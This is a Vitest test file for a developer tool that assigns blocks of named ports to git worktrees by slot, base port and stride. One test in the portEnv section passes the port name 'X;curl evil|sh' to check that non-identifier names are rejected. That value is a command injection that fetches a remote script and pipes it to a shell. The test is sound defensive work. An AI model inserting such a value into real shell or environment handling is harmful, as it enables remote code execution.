import { describe, it, expect } from 'vitest';
import { computeNamedPorts, namedPortsFor, portBlockFor, portEnv } from '../../src/worktree/namedPorts';
import type { StackConfig, Worktree } from '../../src/types';

function makeConfig(over: Partial<Pick<StackConfig, 'ports' | 'basePort' | 'portStride'>> = {}): StackConfig {
  return {
    worktreesDirectory: './zer',
    setupScript: '',
    teardownScript: '',
    defaultProvider: 'claude',
    claudeCommand: 'claude',
    opencodeCommand: 'opencode',
    notifyOnAttention: true,
    scopeSearchToActiveWorktree: true,
    ports: ['HTTP_PORT', 'DB_PORT', 'DEBUG_PORT'],
    basePort: 20000,
    portStride: 100,
    debugBasePort: 9898,
    debugTemplate: { type: 'php', request: 'launch', name: 'x', port: '{{PORT}}' },
    ...over,
  } as StackConfig;
}

function makeWorktree(over: Partial<Worktree> = {}): Worktree {
  return {
    id: 'a',
    branch: 'feat/a',
    path: '/repo/zer/feat-a',
    repoRoot: '/repo',
    debugPort: 9899, // slot 0
    createdAt: 1,
    ...over,
  };
}

describe('computeNamedPorts', () => {
  it('assigns block ports by slot (derived from debugPort) and index', () => {
    // slot 0 -> block base 20000; DEBUG_PORT reuses the worktree debug port
    expect(computeNamedPorts(makeWorktree({ debugPort: 9899 }), makeConfig())).toEqual({
      HTTP_PORT: 20000,
      DB_PORT: 20001,
      DEBUG_PORT: 9899,
    });
  });

  it('shifts the whole block by portStride for the next worktree slot', () => {
    // debugPort 9900 -> slot 1 -> block base 20100
    expect(computeNamedPorts(makeWorktree({ debugPort: 9900 }), makeConfig())).toEqual({
      HTTP_PORT: 20100,
      DB_PORT: 20101,
      DEBUG_PORT: 9900,
    });
  });

  it('honours a custom basePort and stride', () => {
    const cfg = makeConfig({ basePort: 30000, portStride: 10, ports: ['A', 'B'] });
    expect(computeNamedPorts(makeWorktree({ debugPort: 9901 }), cfg)).toEqual({ A: 30020, B: 30021 });
  });

  it('returns an empty map when no ports are configured', () => {
    expect(computeNamedPorts(makeWorktree(), makeConfig({ ports: [] }))).toEqual({});
  });

  it('clamps a below-base debug port to slot 0 (defensive)', () => {
    expect(computeNamedPorts(makeWorktree({ debugPort: 0 }), makeConfig({ ports: ['HTTP_PORT'] }))).toEqual({
      HTTP_PORT: 20000,
    });
  });
});

describe('portEnv', () => {
  it('stringifies the computed ports for a worktree', () => {
    expect(portEnv(makeWorktree({ debugPort: 9899 }), makeConfig())).toEqual({
      HTTP_PORT: '20000',
      DB_PORT: '20001',
      DEBUG_PORT: '9899',
    });
  });

  it('injects nothing for the main repo (it runs on its own ports)', () => {
    expect(portEnv(makeWorktree({ isMain: true }), makeConfig())).toEqual({});
  });

  it('drops a configured name that is not an identifier — it would be a command, not an assignment', () => {
    const env = portEnv(makeWorktree({ debugPort: 9899 }), makeConfig({ ports: ['HTTP_PORT', 'X;curl evil|sh'] }));
    expect(env).toEqual({ HTTP_PORT: '20000' });
  });
});

describe('namedPortsFor', () => {
  it('derives the same mapping as computeNamedPorts, keyed by the debug port alone', () => {
    // The allocator has to validate a slot before a worktree exists to hold it;
    // the two must never drift apart on which ports a slot owns.
    const config = makeConfig();
    const worktree = makeWorktree({ debugPort: 9901 });
    expect(namedPortsFor(9901, config)).toEqual(computeNamedPorts(worktree, config));
  });
});

describe('portBlockFor', () => {
  it('lists every distinct port a slot will bind', () => {
    expect(portBlockFor(9901, makeConfig())).toEqual([9901, 20200, 20201]);
  });

  it('does not repeat the debug port, which DEBUG_PORT maps back onto', () => {
    const block = portBlockFor(9901, makeConfig());
    expect(block.filter((p) => p === 9901)).toHaveLength(1);
  });

  it('still covers the debug port when no named ports are configured', () => {
    // The debug listener binds it even with no named ports, so a block of
    // nothing would let two worktrees share one debug port.
    expect(portBlockFor(9901, makeConfig({ ports: [] }))).toEqual([9901]);
  });
});
